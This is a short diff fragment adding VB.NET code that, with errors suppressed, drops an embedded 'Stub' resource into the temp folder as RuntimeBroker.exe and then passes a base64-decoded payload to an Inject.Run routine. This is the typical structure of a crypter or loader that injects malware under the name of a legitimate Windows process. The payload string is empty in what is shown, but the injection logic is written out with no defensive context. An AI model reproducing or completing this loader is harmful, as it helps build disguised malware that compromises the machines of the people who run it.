@@ -1,0 +1,5 @@
+        On Error Resume Next
+        IO.File.WriteAllBytes(System.IO.Path.GetTempPath() & "\RuntimeBroker.exe", My.Resources.Stub)
+        Dim InjPath As String = System.IO.Path.GetTempPath() & "\RuntimeBroker.exe"
+	    Dim byt As Byte() = Convert.FromBase64String("")
+	    Inject.Run(InjPath, byt)
